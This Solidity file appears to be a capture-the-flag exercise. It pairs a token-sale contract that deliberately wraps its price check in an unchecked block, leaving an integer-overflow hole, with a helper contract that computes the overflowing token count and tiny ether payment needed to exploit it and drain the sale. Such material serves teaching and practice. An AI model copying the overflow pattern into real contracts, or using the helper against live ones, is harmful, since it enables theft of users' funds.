// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.17;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 public constant PRICE_PER_TOKEN = 1 ether;

    constructor() payable {
        require(msg.value == 1 ether, "Send 1 ether");
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        unchecked {
            require(msg.value == numTokens * PRICE_PER_TOKEN, "Wrong value");
        }

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens, "Insufficient balance");

        balanceOf[msg.sender] -= numTokens;
        payable(msg.sender).transfer(numTokens * PRICE_PER_TOKEN);
    }
}

contract TokenSaleOverflowHelper {
    TokenSaleChallenge private challenge;

    constructor(address challengeAddress) {
        challenge = TokenSaleChallenge(challengeAddress);
    }

    function calculateTokenNumberAndValue() external view returns (uint256 numTokens, uint256 ethValue) {
        numTokens = type(uint256).max / challenge.PRICE_PER_TOKEN() + 1;
        unchecked {
            ethValue = numTokens * challenge.PRICE_PER_TOKEN();
        }
    }
}
